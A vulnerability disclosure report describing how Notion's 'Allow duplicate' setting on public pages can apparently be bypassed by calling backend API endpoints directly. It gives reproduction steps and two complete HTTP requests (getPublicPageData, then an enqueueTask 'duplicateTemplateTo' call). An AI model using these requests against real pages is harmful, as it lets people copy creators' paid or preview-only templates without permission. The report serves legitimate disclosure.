## Description:

Notion allows workspace owners to publish pages publicly while disabling duplication to prevent others from copying the page as a template. This restriction is enforced at the UI level.

However, by interacting directly with Notion’s backend GraphQL API, it is possible to trigger the page duplication functionality even when the “Allow duplicate” option is disabled. The backend processes the duplication request successfully without validating whether duplication is permitted for the target page.

This indicates that the duplication restriction is not enforced server-side and can be bypassed through backend requests.

## Steps to Reproduce

1. Create a notion page and publish it so anybody can access it on the web
2. turn off "Duplicate as template

<img width="959" height="443" alt="Image" src="https://github.com/user-attachments/assets/42cb2b1d-be00-4571-a06d-47fc1495a47a" />
3. now as an attacker access the public notion page that was published
4. observe that the duplicate template button is absent
5. now right click and click "**View Page Source**" then search for page Id and save the Id somewhere

<img width="959" height="509" alt="Image" src="https://github.com/user-attachments/assets/285574af-e21d-43e3-9087-142170ff6bdd" />

6. now run this graph ql request below and input the saved page_id here `"blockId":`:

```
 POST /api/v3/getPublicPageData HTTP/2
Host: warp-curler-674.notion.site
Content-Length: 443
Sec-Ch-Ua-Platform: "Windows"
Notion-Client-Version: 23.13.20260110.1244
Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Notion-Audit-Log-Platform: web
Sec-Ch-Ua-Mobile: ?0
X-Notion-Active-User-Header: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://warp-curler-674.notion.site
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Sec-Fetch-Storage-Access: active
Referer: https://warp-curler-674.notion.site/ebd//7a9f4aecc4a0409e8631c943d4b0fddb?pvs=27&qid=1%3A2f062ccf-65c8-45f1-95fc-2061bf93c926%3A0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

{"type":"block-space","name":"page","blockId":"inpute_Page_id","spaceDomain":"","requestedOnPublicDomain":true,"requestedOnExternalDomain":false,"embedded":true,"showMoveTo":false,"saveParent":false,"shouldDuplicate":false,"projectManagementLaunch":false,"configureOpenInDesktopApp":false,"pageVisitSource":"27","mobileData":{"isPush":false},"queryId":"1:2f062ccf-65c8-45f1-95fc-2061bf93c926:0","demoWorkspaceMode":false}
```
7. You will get a response that includes Workspace Id where the page was created from and save the spaceId
8. Next run the below graph ql request with the saved pageId and saved spaceId and also your own workspaceId where the template would be duplicated to:

```
POST /api/v3/enqueueTask HTTP/2
Host: www.notion.so
Cookie: █████████
Content-Length: 873
Sec-Ch-Ua-Platform: "Windows"
Notion-Client-Version: 23.13.20260110.1244
Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Notion-Audit-Log-Platform: web
Sec-Ch-Ua-Mobile: ?0
X-Notion-Active-User-Header: 2e4d872b-594c-8106-b685-00025b0cd4d0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
X-Notion-Space-Id: 16da6379-88db-81f4-bbb6-00033b861953
Accept: */*
Origin: https://www.notion.so
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.notion.so/Big-Motion-ooo-2e4a637988db81bbaf44ffe9758f5f97
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

{"task":{"eventName":"duplicateTemplateTo","request":{"sourceBlock":{"table":"block","id":"thesaved_page_Id","spaceId":"thesaved_space_Id"},"destination":{"table":"space","id":"yourown_workspace_Id","spaceId":"yourown_workspace_Id"},"options":{"addCopyName":false,"deepCopyTransclusionContainers":true,"convertExternalObjectInstancesToPlaceholders":true,"duplicateOnlyCollectionSchema":false,"appendWithoutAfter":true,"templateInstallationMetadata":{"source":"public_page","context":"public_page_duplicate_multiple_workspace","isListedTemplate":false,"isFirstPartyPaidTemplate":false,"isFromDuplicateParam":true},"resolveTemplateVariables":{"currentUserId":"","currentTimeZone":""},"unlockPage":true},"templateOptions":{}},"cellRouting":{"spaceIds":[]}}}
```
9. now observe that the attacker has successfully duplicated the page template to their own workspace.

## Impact:
An attacker can bypass the “Allow duplicate” restriction to duplicate any public Notion page, affecting creators who intentionally disable duplication (e.g., paid templates or on preview-only pages). the attacker can do this to any/all public pages of such.

**weakness**: Improper access control

**severity calculation**: AC: Low - PR: None - Integrity: High - Scope: Unchanged
